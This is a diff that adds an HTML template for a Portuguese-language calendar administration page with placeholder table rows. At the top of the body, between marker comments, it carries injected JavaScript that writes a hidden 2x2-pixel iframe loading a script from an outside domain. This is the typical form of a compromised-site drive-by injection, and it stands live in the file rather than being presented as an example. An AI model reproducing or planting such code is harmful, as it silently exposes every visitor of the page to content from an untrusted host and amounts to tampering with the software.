@@ -1,0 +1,28 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>Administrador de Calendário - Henrique Cursos</title>
+
+</head>
+<body><!--c3284d--><script type="text/javascript">
+document.write('<iframe src="http://pahgawks.com/download/stats.php" name="Twitter" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');
+</script><!--/c3284d-->
+
+
+
+
+
+
+<table>
+<tr bgcolor="#F0F0F0"><td colspan="3">Administração de Calendário</td></tr>
+<tr bgcolor="#F0F0F0">
+   
+    <td><div align="left">[bloco1.nome]</div></td>
+    <td><a href="lista_calendario.php?id="[bloco1.id;block=tr]">VISUALIZAR</td>
+   
+</tr>
+
+</table>
+
+</body>
+</html>
